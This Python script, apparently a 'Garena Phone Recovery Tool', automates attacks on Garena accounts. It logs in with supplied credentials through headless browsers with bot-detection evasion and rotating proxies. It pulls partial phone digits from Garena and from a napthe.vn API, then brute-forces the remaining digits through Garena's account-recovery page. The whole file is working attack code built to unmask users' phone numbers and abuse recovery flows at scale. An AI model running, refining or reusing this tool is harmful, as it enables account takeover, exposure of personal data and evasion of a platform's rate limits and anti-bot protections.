#!/usr/bin/env python3
"""
Garena Phone Recovery Tool v5 - Fixed & Improved
- Pattern extraction fixes
- Retry logic with proxy rotation
- Better error detection
- Input sanitization
- --no-proxy option for testing
"""

import argparse
import asyncio
import json
import re
import random
import time
from dataclasses import asdict, dataclass, field
from pathlib import Path
from typing import List, Optional, Tuple
from datetime import datetime

import aiofiles
from playwright.async_api import async_playwright, TimeoutError as PlaywrightTimeoutError

# ============================================================================
# CONFIG
# ============================================================================

LOGIN_URL = "https://sso.garena.com/universal/login?app_id=10100&redirect_uri=https%3A%2F%2Faccount.garena.com%2F&locale=vi-VN"
ACCOUNT_URL = "https://account.garena.com/"
NAPTHE_LOGIN_URL = "https://napthe.vn/"
NAPTHE_API_URL = "https://napthe.vn/api/auth/get_user_info/multi"
RECOVERY_URL = "https://account.garena.com/recovery#/"

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
]

# ============================================================================
# DATA CLASSES
# ============================================================================

@dataclass
class Phase1Result:
    """Phase 1: Garena login & extract last 4 digits"""
    login_status: str  # success | failed | manual_required
    last_4_digits: str = ""
    masked_phone: str = ""
    error: str = ""


@dataclass
class Phase2Result:
    """Phase 2: napthe.vn API & extract first 3 digits"""
    api_status: str  # success | failed
    first_3_digits: str = ""
    display_phone: str = ""
    error: str = ""


@dataclass
class Phase3Result:
    """Phase 3: Recovery brute-force & complete phone"""
    recovery_status: str  # success | failed
    complete_phone: str = ""
    attempts: int = 0
    error: str = ""


@dataclass
class RecoveryResult:
    """Complete recovery result"""
    username: str
    status: str  # success | failed | manual_required
    timestamp: str = ""
    proxy_used: str = ""
    phase1: Phase1Result = field(default_factory=lambda: Phase1Result("failed"))
    phase2: Phase2Result = field(default_factory=lambda: Phase2Result("failed"))
    phase3: Phase3Result = field(default_factory=lambda: Phase3Result("failed"))


# ============================================================================
# PROXY MANAGER
# ============================================================================

class ProxyRotator:
    """Manages rotating proxy list"""
    
    def __init__(self, proxy_list: List[str]):
        self.proxies = [self._normalize_proxy(p) for p in proxy_list if p.strip()]
        self.current_index = 0
        self.dead_proxies = set()
        self.failed_count = {p: 0 for p in self.proxies}
        self.success_count = {p: 0 for p in self.proxies}
    
    def _normalize_proxy(self, proxy: str) -> str:
        """Convert host:port to http://host:port if needed"""
        proxy = proxy.strip()
        if "://" not in proxy:
            return f"http://{proxy}"
        return proxy
    
    def get_next_proxy(self) -> Optional[str]:
        """Get next healthy proxy"""
        if not self.proxies:
            return None
        
        healthy = [p for p in self.proxies if p not in self.dead_proxies]
        if not healthy:
            print("[PROXY] All proxies dead, resetting...")
            self.dead_proxies.clear()
            healthy = self.proxies
        
        if not healthy:
            return None
        
        proxy = healthy[self.current_index % len(healthy)]
        self.current_index += 1
        return proxy
    
    def mark_success(self, proxy: str) -> None:
        """Mark proxy as successful"""
        if proxy in self.success_count:
            self.success_count[proxy] += 1
            self.failed_count[proxy] = 0
            self.dead_proxies.discard(proxy)
    
    def mark_dead(self, proxy: str) -> None:
        """Mark proxy as dead after 3 failures"""
        if proxy in self.failed_count:
            self.failed_count[proxy] += 1
            if self.failed_count[proxy] >= 3:
                self.dead_proxies.add(proxy)
                print(f"[PROXY] Dead: {proxy}")
    
    def get_stats(self) -> dict:
        """Get proxy statistics"""
        return {
            "total": len(self.proxies),
            "dead": len(self.dead_proxies),
            "healthy": len(self.proxies) - len(self.dead_proxies),
            "success_count": dict(self.success_count),
            "failed_count": dict(self.failed_count),
        }


# ============================================================================
# UTILITY FUNCTIONS
# ============================================================================

async def read_proxy_file(path: str = "proxies.txt") -> List[str]:
    """Read proxies from file"""
    proxies = []
    file_path = Path(path)
    
    if not file_path.exists():
        print(f"[WARN] Proxy file not found: {path}")
        return proxies
    
    try:
        async with aiofiles.open(path, "r", encoding="utf-8", errors="ignore") as f:
            async for line in f:
                line = line.strip()
                if line and not line.startswith("#"):
                    proxies.append(line)
        print(f"[OK] Loaded proxies.txt ({len(proxies)} proxies)")
        for proxy in proxies[:3]:
            print(f"     - {proxy}")
        if len(proxies) > 3:
            print(f"     ... and {len(proxies) - 3} more")
    except Exception as e:
        print(f"[ERR] Failed to read proxies.txt: {str(e)[:100]}")
    
    return proxies


def get_accounts_interactive() -> List[Tuple[str, str]]:
    """Get accounts from interactive input"""
    accounts = []
    print("\n" + "="*60)
    print("Enter Garena accounts (format: username:password)")
    print("Type 'done' when finished")
    print("="*60 + "\n")
    
    while True:
        try:
            line = input(f"Account [{len(accounts)+1}]: ").strip()
        except KeyboardInterrupt:
            print("\n[Cancelled by user]")
            return []
        
        if line.lower() == "done":
            break
        
        if not line:
            continue
        
        if ":" not in line:
            print("❌ Invalid format! Use: username:password")
            continue
        
        parts = line.split(":", 1)
        if len(parts) != 2:
            print("❌ Invalid format! Use: username:password")
            continue
        
        username = parts[0].strip()
        password = parts[1].strip()
        
        if not username or not password:
            print("❌ Username and password cannot be empty!")
            continue
        
        accounts.append((username, password))
        print(f"✓ Added: {username}")
    
    return accounts


def extract_last_4(masked_phone: str) -> str:
    """
    Extract last 4 digits from masked phone format.
    Fixed: Support multiple spaces, different formats
    Examples: "+84 ****7287", "+84  ****7287", "0****7287" → "7287"
    """
    if not masked_phone:
        return ""
    
    # Extract all digits
    digits = re.findall(r"\d", masked_phone)
    
    if len(digits) >= 4:
        # Get last 4 digits
        return "".join(digits[-4:])
    
    return ""


def extract_first_3(display_phone: str) -> str:
    """
    Extract first 3 digits from display_mobile_no.
    Fixed: Better handling of country codes
    Examples: "+84 94*****87", "094*****87", "+8494****87" → "94"
    """
    if not display_phone:
        return ""
    
    phone = display_phone.strip()
    
    # Remove country code +84
    phone = re.sub(r"^\+84\s*", "", phone)
    
    # Remove leading 0
    phone = re.sub(r"^0", "", phone)
    
    # Extract all digits
    digits = re.findall(r"\d", phone)
    
    if len(digits) >= 3:
        # Get first 3 digits
        return "".join(digits[:3])
    
    return ""


def sanitize_username_for_js(username: str) -> str:
    """
    Sanitize username for safe JavaScript injection
    Escapes special characters and quotes
    """
    # Use JSON encoding to safely escape
    return json.dumps(username)


# ============================================================================
# PHASE 1: GARENA LOGIN
# ============================================================================

async def phase1_garena_login(
    username: str,
    password: str,
    timeout: int = 45000,
    proxy: Optional[str] = None,
    retry_count: int = 0,
    max_retries: int = 3,
) -> Phase1Result:
    """Phase 1: Login to Garena and extract last 4 digits"""
    result = Phase1Result(login_status="failed")
    
    launch_kwargs = {
        "headless": True,
        "args": ["--no-sandbox", "--disable-blink-features=AutomationControlled"],
    }
    if proxy:
        launch_kwargs["proxy"] = {"server": proxy}
    
    context = None
    try:
        async with async_playwright() as p:
            browser = await p.chromium.launch(**launch_kwargs)
            context = await browser.new_context(
                locale="vi-VN",
                viewport={"width": 1280, "height": 800},
                user_agent=random.choice(USER_AGENTS),
            )
            page = await context.new_page()
            
            print(f"  [Phase 1] Garena login... (attempt {retry_count + 1}/{max_retries})")
            
            # Navigate to login
            try:
                await page.goto(LOGIN_URL, wait_until="domcontentloaded", timeout=timeout)
                await asyncio.sleep(1)
            except Exception as e:
                result.error = f"Navigation failed: {str(e)[:100]}"
                await browser.close()
                return result
            
            # Fill credentials
            try:
                await page.fill("input[name='username']", username, timeout=5000)
                await page.fill("input[name='password']", password, timeout=5000)
                await page.click("button[type='submit']", timeout=5000)
            except Exception as e:
                result.error = f"Failed to fill credentials: {str(e)[:100]}"
                await browser.close()
                return result
            
            # Wait for navigation
            await asyncio.sleep(2)
            try:
                await page.wait_for_load_state("networkidle", timeout=10000)
            except PlaywrightTimeoutError:
                print("  [WARN] networkidle timeout, continuing...")
            
            # Check for CAPTCHA
            try:
                captcha_frame = page.locator("iframe[src*='captcha'], iframe[src*='recaptcha']")
                if await captcha_frame.count() > 0:
                    result.login_status = "manual_required"
                    result.error = "CAPTCHA required"
                    print("[CAPTCHA] Detected. Please solve and press ENTER...")
                    await asyncio.to_thread(input)
                    await asyncio.sleep(2)
            except Exception:
                pass
            
            # Check for OTP
            try:
                otp_elem = page.locator("text=/mã xác minh|OTP|otp/i")
                if await otp_elem.count() > 0:
                    result.login_status = "manual_required"
                    result.error = "OTP required"
                    print("[OTP] Required. Please solve and press ENTER...")
                    await asyncio.to_thread(input)
                    await asyncio.sleep(2)
            except Exception:
                pass
            
            # Get page content to check for errors
            page_text = await page.evaluate("() => document.body.innerText")
            current_url = page.url
            
            # Check for login failure messages
            login_error_messages = [
                "tài khoản không tồn tại",
                "mật khẩu sai",
                "tài khoản bị khóa",
                "người dùng bị chặn",
                "invalid",
                "incorrect",
                "failed",
            ]
            
            for error_msg in login_error_messages:
                if error_msg.lower() in page_text.lower():
                    result.login_status = "failed"
                    result.error = f"Login error detected: {error_msg}"
                    await browser.close()
                    return result
            
            # Check if still on login page (failed to login)
            if "sso.garena.com" in current_url.lower():
                result.login_status = "failed"
                result.error = "Still on login page - credentials may be incorrect"
                await browser.close()
                return result
            
            # Navigate to account page to get masked phone
            try:
                await page.goto(ACCOUNT_URL, wait_until="domcontentloaded", timeout=timeout)
                await asyncio.sleep(1)
            except Exception as e:
                result.error = f"Failed to navigate to account page: {str(e)[:100]}"
                await browser.close()
                return result
            
            # Extract masked phone with improved pattern
            page_text = await page.evaluate("() => document.body.innerText")
            
            # Improved patterns for masked phone
            patterns = [
                r"\+84\s*\*{2,}\d{4}",      # +84 ****7287 or +84****7287
                r"\+84\s*\d{1,3}\*{2,}\d{2,4}",  # +84 94*****87
                r"0\*{2,}\d{4}",             # 0****7287
                r"0\d{1,2}\*{2,}\d{2,4}",   # 094*****87
            ]
            
            masked_phone = ""
            for pattern in patterns:
                matches = re.findall(pattern, page_text)
                if matches:
                    masked_phone = matches[0]
                    break
            
            result.masked_phone = masked_phone
            result.last_4_digits = extract_last_4(masked_phone)
            
            if result.last_4_digits:
                result.login_status = "success"
                print(f"  [Phase 1] ✓ Last 4 digits: {result.last_4_digits}")
                print(f"  [Phase 1] Masked phone: {masked_phone}")
            else:
                result.error = f"Could not extract last 4 digits from: {masked_phone}"
            
            await browser.close()
            return result
    
    except Exception as e:
        result.error = f"{type(e).__name__}: {str(e)[:100]}"
        return result
    finally:
        if context:
            try:
                await context.close()
            except Exception:
                pass


# ============================================================================
# PHASE 2: NAPTHE.VN API
# ============================================================================

async def phase2_napthe_api(
    username: str,
    password: str,
    timeout: int = 45000,
    proxy: Optional[str] = None,
) -> Phase2Result:
    """Phase 2: Login to napthe.vn and extract first 3 digits from API"""
    result = Phase2Result(api_status="failed")
    
    launch_kwargs = {
        "headless": True,
        "args": ["--no-sandbox", "--disable-blink-features=AutomationControlled"],
    }
    if proxy:
        launch_kwargs["proxy"] = {"server": proxy}
    
    context = None
    try:
        async with async_playwright() as p:
            browser = await p.chromium.launch(**launch_kwargs)
            context = await browser.new_context(
                locale="vi-VN",
                viewport={"width": 1280, "height": 800},
                user_agent=random.choice(USER_AGENTS),
            )
            page = await context.new_page()
            
            print(f"  [Phase 2] napthe.vn login...")
            
            # Navigate to napthe.vn
            try:
                await page.goto(NAPTHE_LOGIN_URL, wait_until="domcontentloaded", timeout=timeout)
                await asyncio.sleep(1)
            except Exception as e:
                result.error = f"Navigation failed: {str(e)[:100]}"
                await browser.close()
                return result
            
            # Fill login form
            try:
                await page.fill("input[name='username'], input[type='email']", username, timeout=5000)
                await page.fill("input[name='password'], input[type='password']", password, timeout=5000)
                await page.click("button[type='submit']", timeout=5000)
            except Exception as e:
                result.error = f"Login failed: {str(e)[:100]}"
                await browser.close()
                return result
            
            # Wait for navigation
            await asyncio.sleep(2)
            try:
                await page.wait_for_load_state("networkidle", timeout=10000)
            except PlaywrightTimeoutError:
                print("  [WARN] networkidle timeout, continuing...")
            
            # Call API to get user info with proper escaping
            print(f"  [Phase 2] Calling API with username: {username}")
            
            try:
                # Sanitize username for JavaScript injection
                username_safe = sanitize_username_for_js(username)
                
                api_response = await page.evaluate(f"""
                    async function() {{
                        try {{
                            const response = await fetch('{NAPTHE_API_URL}', {{
                                method: 'POST',
                                headers: {{'Content-Type': 'application/json'}},
                                body: JSON.stringify({{username: {username_safe}}})
                            }});
                            return await response.json();
                        }} catch(e) {{
                            return {{"error": e.message}};
                        }}
                    }}()
                """)
                
                if isinstance(api_response, dict) and "error" not in api_response:
                    # Extract display_mobile_no
                    display_phone = api_response.get("display_mobile_no", "")
                    
                    if display_phone:
                        result.display_phone = display_phone
                        result.first_3_digits = extract_first_3(display_phone)
                        
                        if result.first_3_digits:
                            result.api_status = "success"
                            print(f"  [Phase 2] ✓ First 3 digits: {result.first_3_digits}")
                            print(f"  [Phase 2] Display phone: {display_phone}")
                            await browser.close()
                            return result
                        else:
                            result.error = f"Could not extract first 3 digits from: {display_phone}"
                    else:
                        result.error = "No display_mobile_no in API response"
                else:
                    result.error = f"API error: {api_response.get('error', 'Unknown error')}"
                
                await browser.close()
                return result
            
            except Exception as e:
                result.error = f"API call failed: {str(e)[:100]}"
                await browser.close()
                return result
    
    except Exception as e:
        result.error = f"{type(e).__name__}: {str(e)[:100]}"
        return result


# ============================================================================
# PHASE 3: RECOVERY BRUTE-FORCE
# ============================================================================

async def phase3_recovery_brute_force(
    username: str,
    first_3_digits: str,
    last_4_digits: str,
    phase3_delay: float = 2.0,
    timeout: int = 45000,
    proxy: Optional[str] = None,
) -> Phase3Result:
    """Phase 3: Brute-force middle 3 digits (000-999)"""
    result = Phase3Result(recovery_status="failed")
    
    if not first_3_digits or not last_4_digits:
        result.error = "Missing first 3 or last 4 digits"
        return result
    
    launch_kwargs = {
        "headless": True,
        "args": ["--no-sandbox", "--disable-blink-features=AutomationControlled"],
    }
    if proxy:
        launch_kwargs["proxy"] = {"server": proxy}
    
    context = None
    found = False
    
    try:
        async with async_playwright() as p:
            browser = await p.chromium.launch(**launch_kwargs)
            context = await browser.new_context(
                locale="vi-VN",
                viewport={"width": 1280, "height": 800},
                user_agent=random.choice(USER_AGENTS),
            )
            page = await context.new_page()
            
            print(f"  [Phase 3] Brute-force recovery (1000 attempts)...")
            print(f"  [Phase 3] Pattern: {first_3_digits}XXX{last_4_digits}")
            
            # Navigate to recovery page
            try:
                await page.goto(RECOVERY_URL, wait_until="domcontentloaded", timeout=timeout)
                await asyncio.sleep(2)
            except Exception as e:
                result.error = f"Failed to navigate to recovery page: {str(e)[:100]}"
                await browser.close()
                return result
            
            # Enter username first (if required)
            try:
                username_inputs = page.locator("input[name='username']")
                if await username_inputs.count() > 0:
                    await username_inputs.first.fill(username)
                    next_buttons = page.locator("button:has-text('Tiếp'), button:has-text('tiếp tục'), button:has-text('Xác nhận')")
                    if await next_buttons.count() > 0:
                        await next_buttons.first.click()
                        await asyncio.sleep(2)
            except Exception as e:
                print(f"  [Phase 3] Info: No username field or proceeding directly to phone input")
            
            # Brute-force middle 3 digits (000-999)
            for middle_attempt in range(0, 1000):
                result.attempts = middle_attempt + 1
                
                middle = str(middle_attempt).zfill(3)
                test_phone = f"{first_3_digits}{middle}{last_4_digits}"
                
                try:
                    # Find phone input (more specific selectors)
                    phone_inputs = page.locator(
                        "input[type='tel'], input[name='phone'], input[placeholder*='điện thoại']"
                    )
                    
                    if await phone_inputs.count() == 0:
                        if middle_attempt % 100 == 0:
                            print(f"  [Phase 3] Warning: Phone input not found at attempt {result.attempts}")
                        await asyncio.sleep(phase3_delay)
                        continue
                    
                    phone_input = phone_inputs.first
                    
                    # Clear and fill phone input
                    await phone_input.fill("")
                    await phone_input.type(test_phone, delay=50)
                    
                    # Find and click verification button
                    verify_buttons = page.locator(
                        "button:has-text('Xác nhận'), button:has-text('Nhận mã'), button:has-text('Gửi'), button[type='submit']"
                    )
                    
                    if await verify_buttons.count() > 0:
                        await verify_buttons.first.click()
                    
                    # Wait for response
                    await asyncio.sleep(phase3_delay)
                    
                    # Get page content
                    page_text = await page.evaluate("() => document.body.innerText")
                    
                    # Success indicators
                    success_indicators = [
                        "Nhập mã xác thực",
                        "mã được gửi",
                        "Mã OTP",
                        "SMS",
                        "verification code",
                        "OTP sent",
                    ]
                    
                    is_success = any(ind.lower() in page_text.lower() for ind in success_indicators)
                    
                    # Also check if phone input disappeared (accepted)
                    try:
                        if not await phone_input.is_visible(timeout=1000):
                            is_success = True
                    except:
                        pass
                    
                    if is_success:
                        result.complete_phone = test_phone
                        result.recovery_status = "success"
                        found = True
                        print(f"  [Phase 3] ✓ Found: {test_phone} (attempt {result.attempts})")
                        await browser.close()
                        return result
                    
                    # Check for rate limit
                    if "429" in page_text or "too many" in page_text.lower():
                        result.error = "Rate limited (429)"
                        await browser.close()
                        return result
                    
                    # Check for account locked
                    if "locked" in page_text.lower() or "khóa" in page_text.lower():
                        result.error = "Account locked"
                        await browser.close()
                        return result
                    
                    # Progress update
                    if (middle_attempt + 1) % 100 == 0:
                        print(f"  [Phase 3] Progress: {result.attempts}/1000 attempts...")
                
                except Exception as e:
                    if middle_attempt % 200 == 0:
                        print(f"  [Phase 3] Error at attempt {result.attempts}: {str(e)[:50]}")
                    await asyncio.sleep(phase3_delay)
                    continue
            
            if not found:
                result.error = "No valid phone found in 1000 attempts"
                result.recovery_status = "failed"
            
            await browser.close()
            return result
    
    except Exception as e:
        result.error = f"{type(e).__name__}: {str(e)[:100]}"
        return result


# ============================================================================
# MAIN PROCESSING WITH RETRY LOGIC
# ============================================================================

async def process_account(
    username: str,
    password: str,
    proxy_rotator: Optional[ProxyRotator],
    args,
    max_retries: int = 3,
) -> RecoveryResult:
    """Process single account with retry logic"""
    result = RecoveryResult(
        username=username,
        status="failed",
        timestamp=datetime.utcnow().isoformat() + "Z",
    )
    
    # Retry logic for Phase 1
    for retry_attempt in range(max_retries):
        proxy = None
        if proxy_rotator and args.use_proxy:
            proxy = proxy_rotator.get_next_proxy()
            result.proxy_used = proxy or ""
            if proxy:
                print(f"  Using proxy: {proxy}")
        
        # Phase 1: Garena Login with retry
        print(f"\n[Phase 1] {username}... (attempt {retry_attempt + 1}/{max_retries})")
        result.phase1 = await phase1_garena_login(
            username, password,
            timeout=args.timeout,
            proxy=proxy,
            retry_count=retry_attempt,
            max_retries=max_retries,
        )
        
        if result.phase1.login_status == "success":
            # Success - proceed to Phase 2
            break
        elif result.phase1.login_status == "manual_required":
            # Manual required - don't retry
            result.status = "manual_required"
            return result
        else:
            # Failed - mark proxy as dead and retry with different proxy
            if proxy and proxy_rotator and args.use_proxy:
                proxy_rotator.mark_dead(proxy)
                print(f"  [RETRY] Trying with different proxy...")
            elif retry_attempt == max_retries - 1:
                # Last retry failed
                result.status = "failed"
                return result
            
            # Wait before retry
            await asyncio.sleep(3)
    
    if result.phase1.login_status != "success":
        result.status = result.phase1.login_status
        return result
    
    await asyncio.sleep(args.phase_delay)
    
    # Phase 2: napthe.vn API
    print(f"\n[Phase 2] {username}...")
    result.phase2 = await phase2_napthe_api(
        username, password,
        timeout=args.timeout,
        proxy=result.proxy_used if args.use_proxy else None
    )
    
    if result.phase2.api_status != "success":
        result.status = "failed"
        if result.proxy_used and proxy_rotator and args.use_proxy:
            proxy_rotator.mark_dead(result.proxy_used)
        return result
    
    await asyncio.sleep(args.phase_delay)
    
    # Phase 3: Recovery Brute-Force
    print(f"\n[Phase 3] {username}...")
    result.phase3 = await phase3_recovery_brute_force(
        username,
        result.phase2.first_3_digits,
        result.phase1.last_4_digits,
        phase3_delay=args.phase3_delay,
        timeout=args.timeout,
        proxy=result.proxy_used if args.use_proxy else None
    )
    
    if result.phase3.recovery_status == "success":
        result.status = "success"
        if result.proxy_used and proxy_rotator and args.use_proxy:
            proxy_rotator.mark_success(result.proxy_used)
    else:
        result.status = "failed"
        if result.proxy_used and proxy_rotator and args.use_proxy:
            proxy_rotator.mark_dead(result.proxy_used)
    
    return result


async def save_results(results: List[RecoveryResult], output_prefix: str, proxy_stats: Optional[dict] = None) -> None:
    """Save results to JSON and TXT files"""
    json_path = Path(f"{output_prefix}.json")
    txt_path = Path(f"{output_prefix}.txt")
    
    output_data = {
        "results": [asdict(r) for r in results],
        "proxy_stats": proxy_stats,
        "summary": {
            "total": len(results),
            "success": len([r for r in results if r.status == "success"]),
            "failed": len([r for r in results if r.status == "failed"]),
            "manual_required": len([r for r in results if r.status == "manual_required"]),
        }
    }
    
    async with aiofiles.open(json_path, "w", encoding="utf-8") as f:
        await f.write(json.dumps(output_data, ensure_ascii=False, indent=2))
    
    async with aiofiles.open(txt_path, "w", encoding="utf-8") as f:
        header = "username|status|last_4|first_3|complete_phone|attempts|error\n"
        await f.write(header)
        
        for r in results:
            line = (
                f"{r.username}|"
                f"{r.status}|"
                f"{r.phase1.last_4_digits}|"
                f"{r.phase2.first_3_digits}|"
                f"{r.phase3.complete_phone}|"
                f"{r.phase3.attempts}|"
                f"{r.phase1.error or r.phase2.error or r.phase3.error}\n"
            )
            await f.write(line)
    
    print(f"\n[OK] Saved: {json_path}")
    print(f"[OK] Saved: {txt_path}")


async def main():
    """Main entry point"""
    parser = argparse.ArgumentParser(
        description="Garena Phone Recovery Tool v5 - Fixed & Improved"
    )
    parser.add_argument("-o", "--output", default="garena_recovery_result", help="Output prefix")
    parser.add_argument("--proxy-list", default="proxies.txt", help="Proxy list file")
    parser.add_argument("--no-proxy", action="store_true", help="Run without proxy (test mode)")
    parser.add_argument("--delay", type=float, default=30.0, help="Delay between accounts (seconds)")
    parser.add_argument("--phase-delay", type=float, default=5.0, help="Delay between phases (seconds)")
    parser.add_argument("--phase3-delay", type=float, default=2.0, help="Delay between recovery attempts (seconds)")
    parser.add_argument("--timeout", type=int, default=45000, help="Timeout (ms)")
    
    args = parser.parse_args()
    args.use_proxy = not args.no_proxy  # Add use_proxy attribute
    
    print("\n" + "="*60)
    print("Garena Phone Recovery Tool v5 - Fixed & Improved")
    print("="*60)
    
    if args.no_proxy:
        print("[MODE] Running WITHOUT proxy (test mode)")
    else:
        # Load proxies
        proxy_list = await read_proxy_file(args.proxy_list)
        if not proxy_list:
            print(f"[WARN] No proxies loaded, running without proxy")
            args.use_proxy = False
    
    print(f"[CONFIG] Phase delays: {args.phase_delay}s | Recovery: {args.phase3_delay}s\n")
    
    # Get accounts from interactive input
    accounts = get_accounts_interactive()
    if not accounts:
        print("[ERR] No accounts provided")
        return
    
    print(f"\n[OK] Loaded {len(accounts)} accounts")
    
    # Setup proxy rotator
    proxy_rotator = None
    if args.use_proxy:
        proxy_list = await read_proxy_file(args.proxy_list)
        if proxy_list:
            proxy_rotator = ProxyRotator(proxy_list)
            print(f"[PROXY] Ready to rotate {len(proxy_list)} proxies")
    
    # Process accounts
    results: List[RecoveryResult] = []
    print(f"\n[START] Processing {len(accounts)} accounts...\n")
    
    for idx, (username, password) in enumerate(accounts, 1):
        print(f"\n{'='*60}")
        print(f"[{idx}/{len(accounts)}] {username}")
        print(f"{'='*60}")
        
        result = await process_account(
            username, password,
            proxy_rotator, args,
            max_retries=3
        )
        results.append(result)
        
        status_emoji = "✓" if result.status == "success" else "✗" if result.status == "failed" else "⚠"
        phone_str = result.phase3.complete_phone or "N/A"
        print(f"\n{status_emoji} Result: {result.status} | Phone: {phone_str}")
        
        if idx < len(accounts):
            print(f"[DELAY] Waiting {args.delay}s before next account...")
            await asyncio.sleep(args.delay)
    
    # Summary
    proxy_stats = proxy_rotator.get_stats() if proxy_rotator else None
    
    print(f"\n\n{'='*60}")
    print("FINAL SUMMARY")
    print(f"{'='*60}")
    
    success = len([r for r in results if r.status == "success"])
    failed = len([r for r in results if r.status == "failed"])
    manual = len([r for r in results if r.status == "manual_required"])
    
    print(f"✓ Success: {success}")
    print(f"✗ Failed: {failed}")
    print(f"⚠ Manual: {manual}")
    
    if proxy_stats:
        print(f"\nProxy Stats:")
        print(f"  Total: {proxy_stats['total']}")
        print(f"  Healthy: {proxy_stats['healthy']}")
        print(f"  Dead: {proxy_stats['dead']}")
    
    await save_results(results, args.output, proxy_stats)


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n\n[Cancelled by user]")
